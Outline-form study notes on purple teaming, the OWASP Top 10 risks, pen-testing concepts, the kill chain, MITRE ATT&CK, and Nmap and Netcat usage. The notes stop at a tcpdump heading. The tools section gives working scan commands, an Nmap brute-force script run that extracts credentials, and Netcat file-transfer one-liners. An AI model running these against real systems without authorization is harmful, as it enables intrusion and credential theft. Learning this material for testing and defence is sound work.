	• Traditional penetration testing pits Red Teams (attackers) against Blue Teams (defenders) in an adversarial way, but Purple Teaming emphasizes collaboration between them. By working side by side, sharing techniques, and improving defenses together, organizations strengthen security more effectively than through red vs. blue competition.

	• Key Concepts

		○ Traditional Red vs. Blue

			§ Red Team (Attackers):

				□ Breakers who think like adversaries.

				□ Goal: find ways to bypass controls, exploit weaknesses, and replicate real-world attacker behavior.

				□ Known for “out-of-the-box” and sometimes rule-breaking thinking.

				□ Reference guide: Red Team Field Manual (RTFM).

			§ Blue Team (Defenders):

				□ Builders who focus on prevention, detection, and response.

				□ Goal: ensure layers of security controls (defense-in-depth).

				□ Typical concerns: strong authentication, logging, patching, monitoring.

				□ Reference guide: Blue Team Field Manual (BTFM) (based on the NIST Cybersecurity Framework).

		○ Purple Teaming Defined

			§ A collaborative model where Red and Blue teams work together during penetration tests.

			§ Instead of adversarial secrecy, both sides share tools, techniques, and findings in real time.

			§ Blue Teamers learn how attackers bypass controls.

			§ Red Teamers see how defenders detect/respond and adapt accordingly.

		○ Benefits of Purple Teaming

			§ Knowledge exchange: Attackers show how controls are bypassed; defenders adapt controls immediately.

			§ Faster resilience: Defenses are strengthened iteratively during testing, not months later.

			§ Skill-building: Both teams sharpen expertise—Red learns detection gaps, Blue learns attack methods.

			§ Increased security maturity: Results in stronger production applications and incident response capabilities.

		○ Practical Tips

			§ Recruit creative thinkers internally who can act as Red Teamers.

			§ Recruit detail-oriented defenders for Blue Team roles.

			§ Provide them with respective field manuals (RTFM for Red, BTFM for Blue).

			§ Foster collaboration, not competition, during pen tests.





#### Testing for the OWASP Top Ten



The OWASP Top Ten

	The OWASP Top 10 is the most widely recognized and influential project in application security. It provides a focused starting point for building a testing program without overwhelming developers and testers. Alongside the Top 10, related OWASP projects (Mobile Security and Proactive Controls) help expand security practices to mobile apps and shift security earlier in the development lifecycle.

	• Key Concepts

		○ OWASP Top 10 Overview

			§ Began in early 2000s as a thought experiment → now the cornerstone of application security.

			§ Identifies the 10 most critical web application security risks.

			§ Updated every 3 years, released first in English then translated globally.

			§ Widely adopted in commercial and open-source security tools.

			§ Used for testing, reporting, and industry benchmarking.

		○ Why Start with OWASP Top 10

			§ Prevents overcomplication and overwhelm for testers/developers.

			§ Provides a walk-before-run approach: build a foundation, achieve early wins, then expand.

			§ Ensures focus on high-impact, common risks first.

		○ Related OWASP Projects

			§ OWASP Mobile Application Security Project

				□ Recognizes that mobile app risks differ from web app risks.

				□ Provides:

					® Mobile Top 10

					® Mobile Application Security Testing Guide

					® Mobile Application Security Verification Standard (MASVS)

					® Mobile Application Security Checklist

				□ OWASP Proactive Controls Project

					® Focuses on prevention rather than reaction.

					® Helps developers build security in from the start.

					® Developer-centric → practical steps to avoid introducing vulnerabilities.

				□ Practical Advice

					® Don’t try to test everything at once → focus on the Top 10 risks first.

					® Gain a few successes early to build confidence and momentum.

					® Use Top 10 as the foundation, then expand into mobile and proactive controls as maturity grows.



A1: Broken Access Control

	• Broken access control is the most significant risk in the OWASP Top 10. It occurs when applications fail to properly enforce rules that restrict what authenticated users can do or see. These flaws are difficult for automated scanners to detect and often require manual testing aligned with business rules to identify. Exploiting these flaws can lead to account impersonation, privilege escalation, or unauthorized access to sensitive data.

	• Key Concepts

		○ What is Broken Access Control?

			§ Access control = restrictions on what authenticated users can do.

			§ Broken access control = when users can go beyond their intended permissions.

			§ Examples:

				□ A user accessing another’s data.

				□ A low-privileged user escalating to admin rights.

				□ Accessing restricted directories or APIs.

		○ Why It’s a Serious Risk

			§ Automated scanners struggle to detect these flaws since they don’t understand business rules.

			§ Business-specific rules vary (e.g., who can reset whose password).

			§ Developers may miss controls without a standardized access management framework.

			§ Impact can range from annoyance → full application takeover.

		○ Testing for Broken Access Control

			§ Manual testing is essential.

			§ Check:

				□ Account provisioning (self-registration vs. manual request).

				□ Directory protections (unprotected folders, directory listing disabled).

				□ Privilege escalation paths (can you assign yourself new permissions?).

			§ OWASP Web Security Testing Guide:

				□ Identity management tests (Section 4.3).

				□ Authorization tests (Section 4.5).

		○ Preventive Measures \& Best Practices

			§ Default deny mindset → deny everything unless explicitly allowed.

			§ Role-based access control (RBAC) → re-use standardized mechanisms.

			§ Validate permissions on every request → never assume continued authorization.

			§ Logging and monitoring → developers implement logging, security teams monitor/respond.

			§ Rate limiting → prevent automated brute-force or abuse of APIs.

			§ Disable directory listing at web server level.

			§ Use the OWASP Authorization Cheat Sheet:

				□ Enforce least privilege.

				□ Deny by default.

				□ Validate permissions rigorously.

		○ Example Attack

			§ Pen tester exploited an app with identical user permissions.

			§ Changed user identifier post-login → impersonated other users.

			§ Found an admin account → full takeover of application.



A2: Cryptographic Failures

	• Cryptographic failures occur when sensitive data is not properly protected at rest or in transit. These flaws can allow attackers to steal or manipulate data without exploiting deeper vulnerabilities like injection or broken access controls. Proper planning, implementation, and management of encryption, hashing, and encoding are essential to prevent data breaches, regulatory fines, and reputational damage.

	• Key Concepts

		○ What Are Cryptographic Failures?

			§ Occur when sensitive data is:

				□ Unencrypted in transit (e.g., HTTP instead of HTTPS).

				□ Unencrypted at rest (e.g., passwords or PII stored in plaintext).

				□ Improperly encrypted (weak algorithms, poor key management).

				□ Accessible without controls (misconfigured directories).

			§ Result: Data can be stolen without advanced exploitation.

		○ Common Causes

			§ Encryption not defined in early design requirements.

			§ Improper implementation (e.g., weak keys, outdated ciphers, storing raw secrets).

			§ Confusion between:

				□ Encryption → reversible with a key.

				□ Hashing → one-way, used for integrity and passwords.

				□ Encoding → reversible, not security (e.g., Base64).

		○ Risks \& Impact

			§ Data breaches exposing sensitive personal, financial, or healthcare data.

			§ Regulatory fines: GDPR, CCPA, PIPEDA, HIPAA.

			§ Business damage: cost, reputation loss, compliance penalties.

			§ Attack scenarios:

				□ Adversary-in-the-middle attack steals data in transit.

				□ Weak ciphers downgraded or brute-forced.

				□ Cached sensitive data extracted.

		○ Best Practices \& Mitigations

			§ Data classification policy: Define what is “sensitive” and how it must be protected.

			§ Encrypt everywhere:

				□ Data in transit (TLS/SSL).

				□ Data at rest (disk/database).

			§ Avoid unnecessary data storage/transmission: Less data = less exposure.

			§ Strong password storage: Salted hashing functions (bcrypt, Argon2).

			§ Disable caching of sensitive data.

			§ Key management: Define lifecycle, rotation, and storage practices.

			§ Use strong algorithms: Avoid known-weak ciphers (e.g., MD5, SHA-1, RC4).

		○ OWASP Resources

			§ OWASP Web Security Testing Guide (4.9) → tests for weak cryptography.

			§ OWASP Cheat Sheets:

				□ Transport Layer Protection.

				□ User Privacy Protection.

				□ Password Storage.

				□ Cryptographic Storage.

			§ OWASP Proactive Controls (C8) → emphasizes classifying data, encryption in transit \& at rest, and key/secret management processes.



A3: Injection

	• Injection flaws (e.g., SQL injection, command injection) occur when untrusted input is sent to a backend interpreter (SQL database, OS command shell, LDAP, XML parser, etc.) without proper validation or sanitization. Since interpreters execute any commands they’re given, attackers can manipulate inputs to execute malicious commands, extract sensitive data, or even take control of entire servers. Injection remains one of the most critical and long-standing risks in the OWASP Top 10.

	• Key Concepts

		○ What is Injection?

			§ Occurs when untrusted input is sent to a backend interpreter.

			§ Interpreters (SQL, OS commands, LDAP, etc.) don’t validate intent—they just execute commands.

			§ Attackers exploit this by manipulating input fields, parameters, or requests.

		○ Attack Vectors

			§ Form fields (login forms, search boxes).

			§ URL parameters (GET/POST variables).

			§ Environment variables.

			§ Application parameters (JSON, XML, API calls).

			§ User-supplied data anywhere input is accepted.

		○ Techniques Used by Attackers

			§ Escape characters: trick interpreters into reinterpreting data as commands.

			§ SQL Injection (SQLi): e.g., making “1=1” true to log in as admin.

			§ Parameter tampering: Adding extra parameters to search queries or JSON.

			§ Command injection: Sending OS-level commands via the app.

			§ Other types: LDAP, NoSQL, XML, XPath, SMTP, IMAP, ORM, SSI injection.

		○ Impacts

			§ Unauthorized data access (e.g., dump entire database).

			§ Privilege escalation.

			§ Compromise of backend servers (full system takeover).

			§ Large-scale data breaches → reputational \& financial damage.

		○ Testing Guidance

			§ Focus dynamic testing on form fields and URL parameters.

			§ OWASP Testing Guide (Section 4.7) → detailed coverage of multiple injection types.

			§ Look for exploitable queries, commands, or parameters.

		○ Prevention \& Mitigation

			§ Use safe APIs and ORM (Object Relational Mapping) tools → avoid raw query construction.

			§ Whitelist input validation (restrict allowed values when feasible).

			§ Encode input before sending to interpreters (to neutralize malicious characters).

			§ Escape special characters properly if dynamic queries are unavoidable.

			§ Use native controls (e.g., LIMIT in SQL to restrict data exposure).

			§ Avoid trusting user input → always sanitize.

		○ Resources

			§ OWASP Injection Prevention Cheat Sheet → examples and secure coding practices.

			§ Bobby Tables (XKCD-inspired) → practical, language-specific SQL injection prevention guide.



A4: Insecure Design

	• Insecure design refers to flaws built into an application’s architecture from the start. Unlike coding/implementation errors, these flaws originate in the planning and design phase of the SDLC. Because they stem from missing or misunderstood business risks, insecure design flaws can’t be fixed with perfect implementation—they require a shift toward secure design practices early in development, threat modeling, and use of maturity models like SAMM and BSIMM.

	• Key Concepts

		○ What is Insecure Design?

			§ Security flaws introduced before code is written, due to poor planning.

			§ Examples:

				□ No mechanism to delete personal data → GDPR violations.

				□ Business risks misunderstood or undocumented.

			§ Design flaws ≠ implementation flaws:

				□ Secure design can mitigate coding mistakes.

				□ But good coding can’t fix insecure design.

		○ Why It’s Risky

			§ Overlooked because organizations often focus on fixing vulnerabilities instead of building security into design.

			§ User stories may emphasize functionality only, ignoring security requirements.

			§ Costly to remediate after deployment → cheaper to design securely upfront.

		○ How to Identify Insecure Design

			§ Review documentation:

				□ SDLC process → does it account for security?

				□ Software Bill of Materials (SBOM): are any libraries insecure?

				□ Test cases \& tools: are security tests integrated into CI/CD?

			§ Look for absence of security-focused design patterns.

		○ How to Address the Risk

			§ Threat modeling: anticipate how attackers might exploit the system.

			§ Reference architectures: reuse proven secure designs (e.g., AWS, Azure, GCP).

			§ Document secure design patterns: e.g., “never put user ID in the URL string.”

			§ Define misuse/abuse cases: simulate how attackers would exploit the design.

			§ Build test cases around threats to validate resilience.

			§ Use maturity models to measure and improve secure design:

				□ OWASP SAMM (Software Assurance Maturity Model).

				□ BSIMM (Building Security In Maturity Model).

		○ Culture \& Process Shift

			§ Requires a mindset change: security is not just QA or post-development.

			§ Needs buy-in from developers, architects, and leadership.

			§ Moves security from an afterthought to a core requirement of business processes.



A5: Security Misconfiguration

	• Security misconfiguration is one of the most common and dangerous OWASP Top 10 risks. It refers to insecure, default, or poorly maintained configurations in applications, servers, or infrastructure. These flaws often arise from weak patch management, verbose error handling, default settings, or improperly secured cloud storage. Misconfigurations can lead to data breaches, system compromise, or attacker advantage — but they’re also among the easiest vulnerabilities to detect and fix when processes and documentation are in place.

	• Key Concepts

		○ Definition

			§ Insecure or default configurations in applications or infrastructure.

			§ Can occur in OS, servers, frameworks, libraries, cloud storage, or application settings.

			§ Includes verbose error messages, exposed config files, weak permissions, unpatched software, or unnecessary components.

		○ Causes of Misconfiguration

			§ Default or insecure settings left enabled (e.g., sample pages, README files).

			§ Verbose error messages exposing stack traces or system details.

			§ Patch management failures: missing updates for OS, frameworks, libraries, apps.

			§ Infrastructure changes that introduce new default configs.

			§ Application changes that add insecure libraries/frameworks.

			§ Cloud storage misconfigurations (open S3 buckets, overly permissive roles).

		○ Risks and Impacts

			§ Range from minor (info disclosure from error messages) to severe (data breaches, full system compromise).

			§ Example:

				□ Directory permissions exposing sensitive files.

				□ World-readable config files containing database credentials.

				□ PHP info pages revealing backend details.

		○ Detection and Testing

			§ Automated vulnerability scanners are effective (binary checks: patch missing or not, version outdated or not).

			§ Dynamic testing → intentionally trigger errors (e.g., HTTP 500) to check error handling and logging.

			§ OWASP Web Security Testing Guide Section 4.2 → 11 tests for security misconfigurations.

		○ Prevention and Mitigation

			§ Documented, repeatable hardening procedures for apps and infrastructure.

			§ Integrate into change control process.

			§ Remove unnecessary components/services (reduce attack surface).

			§ Cloud storage best practices: deny-all first, then grant minimum required access.

			§ Use segmentation and containerization to contain threats.

			§ Restrict verbose error handling to non-production only.

		○ Logging and Monitoring

			§ Proper logging essential for detecting and responding to incidents.

			§ Use resources like Lenny Zeltser’s Critical Log Review Checklist to guide log collection and monitoring.

			§ Ensure security teams can produce logs during incidents with confidence.



A6: Vulnerable and Outdated Components

	• Applications often rely on third-party components (libraries, frameworks, modules), and if these contain known vulnerabilities or are outdated, no configuration changes can protect the app. Without an inventory and maintenance process, these components become high-risk entry points for attackers (e.g., Drupalgeddon, Log4Shell). Preventing this requires streamlining dependencies, maintaining a Software Bill of Materials (SBOM), and continuously monitoring and updating components.

	• Key Concepts

		○ Definition \& Nature of the Risk

			§ Using components with known vulnerabilities introduces risks into web apps.

			§ Different from security misconfiguration: you can’t “configure away” a vulnerability in a component.

			§ Risks increase with application complexity and reliance on third-party libraries.

		○ Why It Happens

			§ Developers adopt components for fast, proven solutions without always reviewing their security.

			§ Lack of inventory or SBOM makes it difficult to track what’s being used.

			§ Projects or libraries may become unsupported/dormant, leaving vulnerabilities unpatched.

		○ Notable Examples

			§ Drupalgeddon (2014) – catastrophic Drupal CMS flaw.

			§ Drupalgeddon2 (2018) – similar repeat exposure.

			§ Log4Shell (2021) – Log4j RCE impacting systems worldwide.

			§ Illustrates high business impact when critical components are vulnerable.

		○ Business Impact

			§ Varies by severity of flaw + role of the application.

			§ Could lead to data breaches, service outages, or full compromise.

			§ Harder to remediate than misconfigurations — sometimes apps depend on vulnerable components.

		○ Detection \& Testing

			§ Automated vulnerability scanners excel at finding outdated components.

				□ Flag known versions (e.g., old Log4j).

				□ Can be fooled by custom banners masking version numbers.

			§ OSINT + web proxies → capture traffic, identify component versions, and cross-check with CVE databases.

		○ Best Practices \& Mitigation

			§ Remove unnecessary components – streamline dependencies.

			§ Maintain a Software Bill of Materials (SBOM) with:

				□ Maintain a Software Bill of Materials (SBOM) with:

				□ Use case

				□ Version

				□ Source location

			§ Use only trusted, signed components from reliable repositories.

			§ Continuously monitor updates \& activity around projects (avoid dormant projects).

		○ Resources \& Tools

			§ OWASP Dependency-Check – Software Composition Analysis (SCA) tool for Java/.NET (works with Maven, Gradle, Jenkins, SonarQube, etc.).

			§ MITRE CVE database – central repository of publicly disclosed vulnerabilities.

			§ Other SCA tools can help identify vulnerable open-source dependencies across different ecosystems.

			



A7: Identification and Authentication Failures

	• Applications are vulnerable if authentication and session management controls are weak or misconfigured. Attackers can bypass logins, reuse stolen credentials, or hijack sessions to gain unauthorized access. Strong identity and access management (IAM), secure session handling, and multifactor authentication (MFA) are essential to preventing these failures.

	• Key Concepts

		○ Nature of the Risk

			§ Identification and authentication failures occur when:

				□ Login controls are weak (default passwords, poor password policies, missing MFA).

				□ Session management is insecure (predictable or reusable session tokens).

			§ Attackers exploit stolen credentials, brute force, credential stuffing, or session hijacking.

		○ Causes

			§ Lack of IAM planning early in development (no standards on password strength, MFA, session rules).

			§ Weak session controls: no lockouts, predictable session IDs, session reuse, simultaneous logins from multiple devices.

			§ Default or guessable credentials still active in production.

		○ Examples of Impact

			§ Low impact: Library app exposing borrowing history.

			§ High impact: Banking app enabling account takeovers and wire transfers.

			§ Critical impact: Infrastructure admin app compromise → full environment takeover.

		○ Testing Considerations

			§ Inspect login and logout flows, cookies, and session variables.

			§ Look for predictable or reusable session IDs (e.g., in URLs).

			§ Validate that weak or default passwords are rejected.

			§ Confirm account lockout and IP lockout for repeated failed logins.

			§ Use OWASP Web Security Testing Guide:

				□ Section 4.3 → identity management (5 tests).

				□ Section 4.4 → authentication (10 tests).

				□ Section 4.6 → session management (9 tests).

		○ Mitigation Best Practices

			§ Multifactor authentication (MFA): Strongest defense against credential misuse.

			§ password hygiene:

				□ Block weak, default, and known-compromised passwords.

				□ Avoid overly complex requirements that harm usability.

				□ Use thoughtful password reset questions (not guessable from social media).

			§ Session management:

				□ Implement on the server-side (client-side controls are easily bypassed).

				□ Use secure cookies, invalidate tokens at logout, expire sessions after inactivity.

				□ Ensure tokens are unpredictable and not exposed in URLs.

			§ Monitoring \& lockouts:

				□ Enforce login attempt lockouts (per account + per IP).

				□ Alert on suspicious login attempts or credential stuffing.

		○ Supporting Resources

			§ OWASP Cheat Sheets:

				□ Authentication

				□ Credential Stuffing Prevention

				□ Password Reset

				□ Session Management

			§ OWASP Web Security Testing Guide → concrete tests for IAM and session flaws.



A8: Software and Data Integrity Failures

	• Software and data integrity failures occur when applications, components, or processes blindly trust unverified code, data, or updates. Without mechanisms to validate integrity, attackers can slip in malicious code (supply-chain attacks, pipeline tampering, untrusted updates), leading to breaches on a massive scale.

	• Key Concepts

		○ What the Risk Is

			§ Based on assumed trust:

				□ That user-provided data is what’s expected.

				□ That software components behave as intended.

			§ If this trust is misplaced, attackers can exploit the gap.

			§ This category evolved from Insecure Deserialization in OWASP 2017, broadened to include integrity flaws in software supply chains and CI/CD pipelines.

		○ How It Happens

			§ Unvalidated updates: Automatic or manual updates applied without integrity checks.

			§ Third-party libraries: Developers pull dependencies from external repos without verifying authenticity.

			§ CI/CD pipeline weaknesses: Poor access controls or weak change management allow tampering.

			§ Serialized/encoded data flaws: Lack of validation lets attackers smuggle malicious payloads.

		○ Examples

			§ PyPI incident (2022): A student uploaded ransomware to the Python Package Index; it was downloaded hundreds of times.

			§ SolarWinds (2022): Attackers poisoned Orion software updates, breaching ~30,000 orgs, including enterprises and governments.

			§ General risk: Once attackers compromise integrity, they can run their own code as if it’s trusted.

		○ Detection and Testing

			§ Validate digital signatures for updates, libraries, and components.

			§ Use an SBOM (Software Bill of Materials) to know what libraries are in your stack.

			§ Review SDLC documentation (especially code reviews \& change control).

			§ Check CI/CD pipeline controls for weak permissions and poor configuration management.

		○ Mitigation and Best Practices

			§ SBOMs: Maintain a full inventory of components and dependencies.

			§ Digital signature validation: Automate verification before trusting code or updates.

			§ Internal repositories: Vet external libraries, then host them in a trusted repo for devs to use.

			§ Good documentation: Clear SDLC standards, code review processes, and change control policies.

			§ Third-party vetting: Scan libraries for vulnerabilities before integrating them.

		○ Helpful Tools \& Resources

			§ OWASP CycloneDX: Standard for building SBOMs, includes guidance, advisory format, and ~200 supporting tools.

			§ OWASP Dependency-Check: Automates software composition analysis (SCA), scanning dependencies for known vulnerabilities (via CVE databases).



A9: Security Logging and Monitoring Failures

	• Security logging and monitoring failures occur when applications lack proper logging, monitoring, and alerting mechanisms. Without them, attackers can operate undetected, moving from reconnaissance to exploitation and full compromise. Logging and monitoring are essential for early detection, containment, and response to attacks.

	• Key Concepts

		○ Why These Failures Happen

			§ Developers prioritize functionality and go-live deadlines over logging.

			§ Security logging requirements often aren’t defined in the project.

			§ Developers may lack security training or awareness of the risks.

			§ Missing policies, standards, and documentation leave teams without guidance.

		○ Impact of Logging Failures

			§ Reconnaissance phase: attackers probe apps—if logs detect this, damage is negligible.

			§ Attack phase: if recon goes unnoticed, attackers attempt injections, brute force, etc.—impact increases.

			§ Full compromise: without logging/alerts, attackers can breach data, take over systems, or cause outages.

			§ Severity depends on application criticality and whether it processes sensitive/restricted data.

		○ Detection \& Testing

			§ Failures are hard to spot in black box tests (no internal visibility).

			§ Better tested with white box or gray box approaches, often via purple teaming (red team + blue team collaboration).

			§ Blue team must validate whether logs:

				□ Were generated.

				□ Contain required details.

				□ Triggered alerts and responses.

		○ Mitigation \& Best Practices

			§ Log high-value events:

				□ Login activity (success/failure).

				□ Access control failures.

				□ Input validation failures.

			§ Centralize logs on a secure server (prevents tampering and supports correlation).

			§ Implement integrity controls to detect log modification/deletion.

			§ Ensure logs are reviewed and acted upon, not just collected.

		○ Resources

			§ Lenny Zeltser’s Critical Log Review Cheat Sheet – practical guidance for incident logging.

			§ NIST SP 800-61 Rev 2 – Computer Security Incident Handling Guide.

			§ Intelligence Community Standard (ICS) 500-27 – advanced guidance on audit data collection and sharing.



A10: Server-Side Request Forgery (SSRF)

	• Server-Side Request Forgery (SSRF) vulnerabilities allow attackers to trick a server into making unintended requests, often to internal systems or sensitive resources, bypassing security boundaries. SSRF is increasingly dangerous in cloud environments and has caused multiple major breaches.

	• Key Concepts

		○ What SSRF Is

			§ An attacker manipulates server-side URL requests to access or abuse internal resources.

			§ Differs from command injection:

					® Command injection = attacker forces server to run system-level commands.

					® SSRF = attacker tricks server into making network requests, possibly leading to further compromise.

		○ How SSRF Works

			§ Attacker supplies a crafted URL or input field value.

			§ If the app doesn’t validate URLs, the server will process requests like:

				□ Local file access (e.g., /etc/passwd on Linux).

				□ Internal network mapping (hostnames, IPs, ports).

				□ Requests to attacker-controlled URLs → enabling malicious code execution or DoS.

			§ Cloud misconfigurations (like exposed storage buckets) amplify the risk.

		○ Risks \& Impact

			§ Unauthorized access to internal services (databases, APIs).

			§ Data theft (sensitive files).

			§ Remote code execution (RCE).

			§ Denial-of-service (overloading internal servers).

			§ Breaches in cloud-hosted systems due to overly permissive network access.

		○ Testing \& Indicators

			§ Look for weak/missing URL validation.

			§ Check if the app trusts all user-supplied URLs.

			§ Evaluate architecture: does network segmentation restrict internal traffic?

			§ Validate how the app handles redirects and other protocols (not just HTTP).

		○ Mitigation Strategies

			§ Input validation \& sanitation of URLs.

			§ Deny HTTP redirects to attacker-controlled destinations.

			§ Use allow-lists (preferred over deny-lists) to restrict outbound traffic to known safe destinations.

			§ Network segmentation to limit what internal services are reachable.

			§ Strong cloud security configuration standards to prevent misconfigured buckets/endpoints.

		○ Resources

			§ OWASP SSRF Prevention Cheat Sheet – practical safeguards for developers.

			§ SSRF Bible (Wallarm research team) – in-depth guide with attack/defense examples (23-page PDF).

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Penetration Testing

#### What is Pen Testing?





Pen Testing Overview

	• Security testing evolved from “prove it works” to “assume it will be attacked.” Pen testing applies an attacker’s mindset, tools, and creativity to uncover weaknesses that functional tests and vuln scanners miss.

	• Key Concepts

		○ Functional testing vs. pen testing: From validating expected behavior to actively trying to break things with unexpected inputs (e.g., command injection, crafted packets).

		○ “Think like a developer” → “Think like an attacker”: Imagination and adversarial tactics are central to modern testing.

		○ Hacker taxonomy

			§ White hats: Authorized testers.

			§ Black hats: Unauthorized (including script kiddies, research hackers, cybercriminals, state-sponsored actors).

			§ Script kiddies: Run prebuilt tools with little skill.

			§ Research hackers: Discover bugs/zero-days, sometimes sell exploits.

			§ State-sponsored \& organized crime: Skilled, stealthy, use zero-days, cause major damage.

		○ Tooling \& frameworks

			§ Individual tools (commercial/community, freeware/shareware).

			§ Kali Linux: A primary free distro bundling 600+ tools; common pen-test platform.

		○ Roles \& skill tiers

			§ Ethical hacker: Runs standard tests to raise baseline assurance.

			§ Pen tester: Deeper skills; finds sophisticated weaknesses; can demonstrate exploitability (modify/create exploits).

			§ Elite pen tester: Highest skill; often discovers zero-days; contributes tools to the community.

		○ Certifications / learning path

			§ CEH: Foundational, now hands-on; entry to ethical hacking/pen testing.

			§ OSCP (PEN-200) from Offensive Security: Benchmark for professional pen testers; proves applied skill against unknown targets.

		○ Pen testing vs. vulnerability scanning

			§ Vuln scanning (e.g., perimeter services, internal scanners like Nessus, Rapid7/Nexpose): Checks for known issues.

			§ Pen testing: Goes beyond signatures to uncover oversights and unknown/zero-day paths.

		○ Red teaming

			§ Unannounced, authorized, full-scope attack simulation across the enterprise; goal is to reach internal systems like a real adversary.

		○ Cyber hunting (threat hunting)

			§ Proactively analyzes networks/servers for indicators of compromise using NIDS and security analytics; an emerging discipline expected to grow.



The Cyber Kill Chain

	• The cyber kill chain is a model introduced by Lockheed Martin (2009) that describes the stages of a cyberattack, from reconnaissance to final action. It provides a framework for defenders to understand, detect, and disrupt attacks at multiple points in their lifecycle.

	• Key Concepts

		○ Origins

			§ Introduced in Lockheed Martin’s paper “Intelligence-Driven Computer Network Defense Informed by Analysis of Adversary Campaigns and Intrusion Kill Chains”.

			§ Concept: Cyberattacks can be understood as a series of steps (a chain), and breaking any step can prevent the attack from succeeding.

		○ The Seven Stages of the Cyber Kill Chain

			§ Reconnaissance

				□ Attacker gathers information about the target.

				□ Techniques: scanning IP addresses, port scanning, mapping domains.

				□ Often automated using botnets.

			§ Weaponization

				□ Developing or acquiring malware tailored to the target.

				□ Example: custom exploits for a specific OS or website.

				□ Increasingly purchased on underground markets rather than coded by the attacker.

			§ Delivery

				□ Getting the malware to the victim.

				□ Methods: phishing emails, malicious websites, stolen/default credentials, infected flash drives.

			§ Exploitation

				□ Malware (or attacker) takes advantage of a vulnerability.

				□ Example: opening a malicious attachment, visiting an infected site, or unauthorized credential use.

			§ Installation

				□ Payload is installed on the victim’s system.

				□ Ensures persistence (e.g., Windows registry autorun).

				□ Creates a foothold for deeper attacks.

			§ Command and Control (C2)

				□ Compromised system contacts the attacker’s server to receive instructions.

				□ Enables remote control, data exfiltration, and continued exploitation.

			§ Actions on Objectives

				□ Final goal depending on attacker motives:

					® Hacktivists → deface websites.

					® State actors → steal sensitive info.

					® Cybercriminals → financial theft.

				□ Always harmful to the victim.

		○ Attack Characteristics

			§ Automation: Large-scale attacks rely on botnets.

			§ Beachheads: Often compromise an exposed host first, then move laterally.

			§ Exploitation methods: Often rely on human error (phishing, malicious documents).

			§ Persistence: Ensures continued access.

			§ Flexibility: C2 servers may change addresses to avoid detection.



The MITRE ATT\&CK Repository

	• The MITRE ATT\&CK framework is a globally accessible, continuously updated knowledge base of adversary tactics, techniques, and procedures (TTPs). It builds on the cyber kill chain concept but goes much deeper—detailing specific methods attackers use, along with detection, mitigation, and attribution information. It’s widely used for threat analysis, defense design, and cyber threat intelligence.

	• Key Concepts

		○ What MITRE ATT\&CK Is

			§ A repository of real-world cyberattack tactics and techniques observed in the wild.

			§ Covers the entire attack lifecycle, from reconnaissance through impact.

			§ Provides practical guidance for defenders to understand how adversaries operate.

		○ Structure

			§ Matrices: Organized by attack stages (12 in total).

				□ Example: External Remote Services under Initial Access shows methods of exploiting remote access points.

			§ Tactics: High-level goals attackers pursue (e.g., Persistence, Privilege Escalation, Collection).

			§ Techniques (and sub-techniques): Specific ways those goals are achieved.

				□ Example: T1123 – Audio Capture → malware can activate the microphone to eavesdrop.

		○ Detailed Information Provided

			§ For each technique, MITRE ATT\&CK includes:

				□ Description of how it works.

				□ Examples of threat actors or malware families using it.

				□ Mitigations: Defensive measures to reduce risk.

				□ Detection methods: Logs, monitoring, behavioral analytics.

				□ References: Links to research and incident reports.

		○ Threat Actor Groups

			§ ATT\&CK tracks known adversary groups and their associated TTPs.

			§ Example: Platinum → a group targeting governments and organizations in South and Southeast Asia.

			§ This helps in attribution and threat profiling.



#### Pen Testing Tools



Scanning networks with Nmap

	Nmap is a core penetration testing tool used to discover hosts, open ports, services, operating systems, and vulnerabilities on a network. It offers a wide range of scanning options that allow security testers to map out attack surfaces and assess system exposure.

	• Key Concepts

		○ Host Discovery

			§ nmap -sn 10.0.2.0/24 → ICMP ping sweep to identify live hosts.

			§ Only reports hosts that respond.

			§ Some hosts may not respond to ping, requiring other options.

		○ TCP Scanning

			§ -PS → TCP SYN scan (SYN ping).

				□ Sends a SYN packet; open ports reply with SYN-ACK.

				□ Connection is terminated before completion.

			§ Reveals which services/ports are open and accessible.

		○ Bypassing Ping Checks

			§ -P0 (or -Pn in newer versions) → Skip ping test.

				□ Useful for systems that block ICMP (e.g., firewalled hosts).

				□ Example: nmap -PS -P0 10.0.2.38.

		○ UDP Scanning

			§ -sU → Probes UDP ports (usually slower and requires root).

			§ Checks common 1,000 UDP ports.

			§ Example: sudo nmap -sU 10.0.2.32.

		○ Service \& Version Detection

			§ -sV → Identifies the version of software running on a port.

			§ -p → Specify a port or port range.

			§ Example: nmap -p22 -sV 10.0.2.32 → Finds OpenSSH 4.7p1.

		○ Combined TCP/UDP \& Custom Ports

			§ Example:

				sudo nmap -sSUV -p U:53,111,137,T:21-25,80,139,8080 10.0.2.32

			§ -sSUV → Scan both TCP/UDP + version detection.

			§ Custom port ranges for deeper analysis.

		○ OS Detection

			§ -O → Fingerprints target OS.

			§ Example: sudo nmap -O 10.0.2.32 → Correctly identifies Linux.

		○ Nmap Scripting Engine (NSE)

			§ Located in /usr/share/nmap/scripts.

			§ Adds advanced capabilities (brute force, vuln detection, malware discovery).

			§ Example:

				nmap --script=rexec-brute -p512 10.0.2.32

			§ Runs brute-force against Rexec service, extracting valid credentials.



A Netcat Refresher

	• Netcat (often called the Swiss Army knife of networking) is a versatile tool for sending, receiving, and manipulating data across networks. It supports functions like chat, file transfer, service interaction, and port listening, making it invaluable for network diagnostics, penetration testing, and system administration.

	• Key Concepts

		○ Fundamental Role

			§ Works as either a sender (client) or receiver (listener).

			§ Transfers raw data streams between systems.

			§ Installed by default in Kali Linux; widely available on other platforms.

		○ Chat / Raw Connection

			§ Listener setup: nc -lp 4545 (listen on port 4545).

			§ Client connection: nc <IP> 4545.

			§ Creates a simple two-way chat over TCP.

			§ Demonstrates Netcat’s ability to establish arbitrary raw connections.

		○ File Transfer

			§ Server/receiver: nc -lp 4545 > incoming.txt → saves incoming data into a file.

			§ Client/sender: nc <target IP> 4545 < myfile.txt → sends file contents.

			§ Allows simple one-line file transfer between systems.

		○ Connecting to Services

			§ HTTP:

				□ nc -v google.com 80 → connects to a web server.

				□ Manually send an HTTP request (e.g., GET /index.html HTTP/1.1).

			§ FTP:

				□ nc -v <IP> 21 → connects to an FTP server.

				□ Supports logging in, issuing commands, and interacting with the service directly.

			§ Shows Netcat as a flexible client for testing services.

		○ Options \& Flags

			§ -l → listen mode.

			§ -p → specify port.

			§ -v → verbose mode (connection feedback).

			§ Redirection (> and <) used for file input/output.

		○ Use Cases

			§ Ad-hoc communication between systems.

			§ Quick file transfer without FTP/HTTP setup.

			§ Testing services like HTTP and FTP at the raw protocol level.

			§ Troubleshooting and penetration testing, e.g., confirming open ports or service behaviors.



Capturing Packets with Tcpdump

